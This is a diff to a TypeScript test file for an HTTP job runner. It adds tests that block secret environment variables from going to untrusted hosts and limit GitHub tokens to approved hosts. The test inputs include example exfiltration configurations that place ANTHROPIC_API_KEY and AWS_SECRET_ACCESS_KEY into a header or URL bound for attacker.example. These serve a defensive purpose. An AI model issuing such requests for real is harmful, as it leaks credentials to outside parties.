@@ -12,6 +12,7 @@ import { JOBS, jobFor, scheduleJobs } from '../../../src/data/jobs/index.js';
 import { hash16, httpKey } from '../../../src/data/jobs/keys.js';
 import {
   blockedByTraffic,
+  type ExecFileLike,
   executeJob,
   type JobCtx,
   type JobEnvelope,
@@ -99,7 +100,12 @@ const keyOf = (config: Config): string => {
   return key!;
 };
 
-async function run(config: Config, env: NodeJS.ProcessEnv, f: typeof fetch = globalThis.fetch) {
+async function run(
+  config: Config,
+  env: NodeJS.ProcessEnv,
+  f: typeof fetch = globalThis.fetch,
+  execFile?: ExecFileLike,
+) {
   const key = keyOf(config);
   const ctx: JobCtx<HttpValue> = {
     env,
@@ -108,6 +114,7 @@ async function run(config: Config, env: NodeJS.ProcessEnv, f: typeof fetch = glo
     prev: readEnvelope<HttpValue>(key, env),
     fetch: f,
     now: NOW,
+    ...(execFile ? { execFile } : {}),
   };
   return executeJob(httpJob, { key }, ctx);
 }
@@ -361,6 +368,55 @@ describe('httpJob.run', () => {
     const plain = await run(withItems(item({ url: 'http://api.example.com/v1', path: '$.a' })), env, f);
     expect(plain.ok).toBe(true);
     expect(calls[1]?.headers.authorization).toBeUndefined();
+  });
+
+  it('refuses denied env names before reading them', async () => {
+    const env = sandbox({ ANTHROPIC_API_KEY: TOKEN, AWS_SECRET_ACCESS_KEY: TOKEN });
+    const { fetch: f, calls } = fakeFetch([json({ a: 1 })]);
+    for (const opts of [
+      { url: 'https://attacker.example/', headers: 'X=$ANTHROPIC_API_KEY' },
+      { url: 'https://attacker.example/?k=${AWS_SECRET_ACCESS_KEY}' },
+    ] as Record<string, string>[]) {
+      const out = await run(withItems(item({ ...opts, path: '$.a' })), env, f);
+      expect(out.ok).toBe(false);
+      expect(out.error).toMatch(/^env (ANTHROPIC_API_KEY|AWS_SECRET_ACCESS_KEY) denied$/);
+      expect(JSON.stringify(out)).not.toContain(TOKEN);
+      const config = withItems(item(opts));
+      expect(httpJob.keys({ config, payload: {}, env, cwd: '/', now: NOW } as any)).toEqual([]);
+    }
+    expect(calls).toHaveLength(0);
+  });
+
+  it('sends GitHub tokens only to GitHub or a host gh is logged in to', async () => {
+    const env = sandbox({ GH_TOKEN: TOKEN });
+    const execs: string[][] = [];
+    const exec =
+      (hosts: string[]): ExecFileLike =>
+      async (_file, args) => {
+        execs.push(args);
+        return {
+          code: 0,
+          stdout: JSON.stringify({ hosts: Object.fromEntries(hosts.map((h) => [h, []])) }),
+          stderr: '',
+        };
+      };
+    const { fetch: f, calls } = fakeFetch([json({ a: 1 }), json({ a: 1 })]);
+    const gh = 'Authorization=Bearer $GH_TOKEN';
+    const ok = await run(
+      withItems(item({ url: 'https://api.github.com/x', headers: gh, path: '$.a' })),
+      env,
+      f,
+    );
+    expect(ok.ok).toBe(true);
+    expect(execs).toHaveLength(0);
+    const other = withItems(item({ url: 'https://ghe.corp.example/api/v3/x', headers: gh, path: '$.a' }));
+    const denied = await run(other, env, f, exec(['github.com']));
+    expect(denied).toMatchObject({ ok: false, error: 'env GH_TOKEN denied', blockedUntil: NOW + 3_600_000 });
+    expect(calls).toHaveLength(1);
+    const listed = await run(other, sandbox({ GH_TOKEN: TOKEN }), f, exec(['ghe.corp.example']));
+    expect(listed.ok).toBe(true);
+    expect(calls).toHaveLength(2);
+    expect(calls[1]?.headers.authorization).toBe(`Bearer ${TOKEN}`);
   });
 
   it('fetches nothing when a header variable is unset', async () => {
